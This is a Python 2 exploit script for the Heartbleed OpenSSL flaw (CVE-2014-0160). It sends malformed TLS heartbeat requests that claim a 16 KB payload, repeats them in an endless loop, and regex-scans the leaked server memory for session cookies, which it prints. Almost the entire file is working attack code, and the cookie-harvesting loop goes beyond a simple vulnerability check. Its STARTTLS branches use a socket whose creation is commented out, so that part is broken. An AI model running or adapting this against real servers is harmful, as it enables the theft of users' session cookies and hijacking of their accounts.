#!/usr/bin/python
import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-s', '--starttls', type='string', default='', help='STARTTLS protocol: smtp, pop3, imap, ftp, or xmpp (default=NULL)')
options.add_option('-t', '--tls', type='int', default=3, help='0=SSLv3, 1=TLSv1, 2=TLS=1.1, 3=TLSv1.2 (default: 3)')

def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')

# Send a client hello: TLSv1.1(not visualized by firefox)
# hello = h2bin('''
# 16 03 02 00  dc 01 00 00 d8 03 02 53
# 43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
# bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
# 00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
# 00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
# c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
# c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
# c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
# c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
# 00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
# 03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
# 00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
# 00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
# 00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
# 00 0f 00 01 01
# ''')
# Send a client hello: TLSv1.2
hello = h2bin('''
16 03 03 00  dc 01 00 00 d8 03 03 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

# SSLv3
hb0 = h2bin('''
18 03 00 00 03
01 40 00
''')

# TLSv1
hb1 = h2bin('''
18 03 01 00 03
01 40 00
''')

# TLSv1.1(normal send)
# try to analyze
# Content Type: Heartbeat (24)
# Version: TLS 1.1 (0x0302)
# Length: 3
# Heartbeat Message Type: Request (1)
# Payload Length: 16384

hb2 = h2bin('''
18 03 02 00 03
01 40 00
''')

# hb2 = h2bin('18 03 02'+' 00 18'+' 01'+' 00 05'+5*' 41')
# correct heartbeat packet example
# hb2 = h2bin('18 03 02'+' 00 18'+' 01'+' 01 54'+5*' 41'+16*' 42')


# TLSv1.2
hb3 = h2bin('''
18 03 03 00 03
01 40 00
''')

def coextract(pay):
    match = re.search(r'Cookie: (.+?={.+?})', pay)
    if match:
        return match.group(1)
    else:
        return None


def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print

def recvall(s, length, timeout=4):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s):
    # retrieve 5 bytes from socket
    hdr = recvall(s, 5)
    # example: 16 03 02 00 3d
    # 16    :22,content type is handshake
    # 03 02 :version is TLS 1.1
    # 00 3d :handshake length is 61 bytes
    if hdr is None:
        print 'Unexpected EOF receiving record header - server closed connection'
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    # retrieve content:61 bytes from socket,wait for 10 seconds
    pay = recvall(s, ln, 10)
    if pay is None:
        print 'Unexpected EOF receiving record payload - server closed connection'
        return None, None, None
    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
    return typ, ver, pay

def hit_hb(s, hb):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print 'No heartbeat response received, server likely not vulnerable'
            return False

        if typ == 24:
            print 'Received heartbeat response:'
            # hexdump(pay)
            if len(pay) > 3:
                cookie=coextract(pay)
                if cookie:
                    print 'Received cookie: %s' % cookie
                print 'WARNING: server returned more data than it should - server is vulnerable!'
            else:
                print 'Server processed malformed heartbeat, but did not return any extra data.'
            return True

        if typ == 21:
            print 'Received alert:'
            hexdump(pay)
            print 'Server returned error, likely not vulnerable'
            return False

BUFSIZ = 1024

def main():
    opts, args = options.parse_args()

    if len(args) < 1:
        options.print_help()
        return

    # create socket
    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # connect server
    # s.connect((args[0], opts.port))

    if opts.starttls != '':
      print 'Sending STARTTLS Protocol Command...'

    if opts.starttls == 'smtp':
      s.recv(BUFSIZ)
      s.send("EHLO openssl.client.net\n")
      s.recv(BUFSIZ)
      s.send("STARTTLS\n")
      s.recv(BUFSIZ)

    if opts.starttls == 'pop3':
      s.recv(BUFSIZ)
      s.send("STLS\n")
      s.recv(BUFSIZ)

    if opts.starttls == 'imap':
      s.recv(BUFSIZ)
      s.send("STARTTLS\n")
      s.recv(BUFSIZ)

    if opts.starttls == 'ftp':
      s.recv(BUFSIZ)
      s.send("AUTH TLS\n")
      s.recv(BUFSIZ)

    if opts.starttls == 'xmpp': # TODO: This needs SASL
      s.send("<stream:stream xmlns:stream='http://etherx.jabber.org/streams' xmlns='jabber:client' to='%s' version='1.0'\n")
      s.recv(BUFSIZ)

    if opts.tls == 0:
        hb = hb0
    elif opts.tls == 1:
        hb = hb1
    elif opts.tls == 2:
        hb = hb2
    elif opts.tls == 3:
        hb = hb3
    else:
        hb = hb3

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print 'Connecting...'
        # connect server
        s.connect((args[0], opts.port))

        print 'Sending Client Hello...'

        s.send(hello)

        print 'Waiting for Server Hello...'

        while True:
            typ, ver, pay = recvmsg(s)
            if typ == None:
                print 'Server closed connection without sending Server Hello.'
                return
            # Look for server hello done message.(handshake end here)
            if typ == 22 and ord(pay[0]) == 0x0E:
                break

        print 'Sending heartbeat request...'
        sys.stdout.flush()
        # start sending heartbeat request
        s.send(hb)
        hit_hb(s, hb)
        s.close()

        time.sleep(3)

if __name__ == '__main__':
    main()